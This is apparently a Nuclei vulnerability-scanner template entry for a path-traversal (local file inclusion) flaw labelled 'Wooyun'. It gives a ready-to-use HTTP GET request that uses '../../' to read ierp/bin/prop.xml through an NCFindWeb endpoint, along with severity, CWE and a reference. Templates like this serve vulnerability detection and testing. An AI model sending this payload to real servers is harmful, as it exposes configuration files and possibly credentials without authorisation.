# Nuclei Template: Wooyun - Local File Inclusion
**Template ID:** wooyun-path-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`wooyun-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Wooyun is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
```

## References
- https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
